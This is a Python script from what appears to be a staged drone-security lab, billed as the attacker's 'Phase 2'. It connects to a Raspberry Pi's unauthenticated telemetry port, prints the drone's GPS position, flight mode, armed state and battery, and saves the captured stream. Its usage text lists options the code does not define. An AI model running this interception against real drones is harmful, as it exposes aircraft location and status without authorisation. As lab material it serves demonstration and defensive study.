#!/usr/bin/env python3
"""
================================================================
  Telemetry Sniffer — Phase 2: Passive Telemetry Capture
  Runs on LAPTOP B (Attacker)
================================================================
  USAGE:
    python sniffer.py --rpi 192.168.1.100
    python sniffer.py --mode http --iface "Wi-Fi"
================================================================
"""

import socket, json, time, argparse
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init()
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""


class TelemetrySniffer:
    def __init__(self):
        self.captured_packets = []
        self.running = False
        self.packet_count = 0
        self.start_time = None

    def sniff_tcp(self, rpi_ip, rpi_port=5760):
        print(f"\n  {Fore.CYAN}[TCP]{Style.RESET_ALL} Connecting to {rpi_ip}:{rpi_port}...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((rpi_ip, rpi_port))
            sock.settimeout(2)
            print(f"  {Fore.GREEN}Connected!{Style.RESET_ALL}\n")
        except Exception as e:
            print(f"  {Fore.RED}Failed: {e}{Style.RESET_ALL}")
            return

        self.running = True
        self.start_time = time.time()
        buffer = ""

        print(f"  {Fore.RED}{Style.BRIGHT}{'='*55}")
        print(f"   INTERCEPTING LIVE DRONE TELEMETRY")
        print(f"  {'='*55}{Style.RESET_ALL}\n")

        try:
            while self.running:
                try:
                    data = sock.recv(8192)
                    if not data:
                        break
                    buffer += data.decode(errors='ignore')
                    try:
                        parsed = json.loads(buffer)
                        buffer = ""
                        self.packet_count += 1
                        self._display(parsed)
                        self.captured_packets.append({"ts": time.time(), "data": parsed})
                    except json.JSONDecodeError:
                        if len(buffer) > 65536:
                            buffer = ""
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            self._summary()

    def _display(self, data):
        t = data.get("telemetry", data)
        alerts = data.get("alerts", [])
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"  {Fore.RED}--- Pkt #{self.packet_count} @ {ts} ---{Style.RESET_ALL}")
        print(f"    GPS:  {Fore.GREEN}{t.get('latitude','?')}, {t.get('longitude','?')}{Style.RESET_ALL}  Alt:{t.get('altitude','?')}m")
        print(f"    Mode: {Fore.CYAN}{t.get('flight_mode','?')}{Style.RESET_ALL}  Armed:{t.get('armed','?')}  Spd:{t.get('speed_3d','?')}m/s")
        batt = t.get('battery_level', '?')
        bc = Fore.GREEN if isinstance(batt,(int,float)) and batt>25 else Fore.RED
        print(f"    Batt: {bc}{batt}%{Style.RESET_ALL}  {t.get('battery_voltage','?')}V")
        print(f"    Sats: {t.get('satellites','?')}  Fix:{t.get('gps_fix_type','?')}")
        if alerts:
            for a in alerts:
                print(f"    {Fore.YELLOW}[{a.get('severity')}] {a.get('type')}: {a.get('message')}{Style.RESET_ALL}")
        print()

    def _summary(self):
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"\n  Captured {self.packet_count} packets in {elapsed:.1f}s")
        if self.captured_packets:
            fn = f"captured_{int(time.time())}.json"
            with open(fn, "w") as f:
                json.dump(self.captured_packets, f, indent=2)
            print(f"  Saved to {fn}")


def main():
    parser = argparse.ArgumentParser(description="Drone Telemetry Sniffer")
    parser.add_argument("--rpi", default=None, help="RPI IP address")
    parser.add_argument("--port", type=int, default=5760)
    args = parser.parse_args()

    rpi_ip = args.rpi
    if not rpi_ip:
        try:
            with open("scan_results.json") as f:
                r = json.load(f)
                if r.get("drone_ips"):
                    rpi_ip = r["drone_ips"][0]
        except FileNotFoundError:
            pass
    if not rpi_ip:
        rpi_ip = input("  Enter RPI IP: ").strip()

    TelemetrySniffer().sniff_tcp(rpi_ip, args.port)


if __name__ == "__main__":
    main()
